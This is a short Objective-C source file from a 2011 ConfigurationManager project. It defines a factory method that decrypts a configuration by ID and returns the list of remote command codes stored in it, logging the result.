//
//  RemoteCmdCodeFactory.m
//  ConfigurationManager
//
//  Created by Makara Khloth on 11/22/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "RemoteCmdCodeFactory.h"
#import "ConfigDecryptor.h"

@implementation RemoteCmdCodeFactory

+(NSArray*) remoteCommandsForConfiguration:(NSString*)aConfigurationID
{
	ConfigDecryptor* cfgDec = [[ConfigDecryptor alloc]initWithConfigurationID:aConfigurationID] ;
	NSArray* remoteCommands =  nil;
	if(cfgDec)
	{
		remoteCommands = [NSArray arrayWithArray:[cfgDec getRemoteCommands]];
		[cfgDec release];
	}
	DLog (@"Remote commands from configuration file = %@", remoteCommands);
	
	return remoteCommands;
}

@end
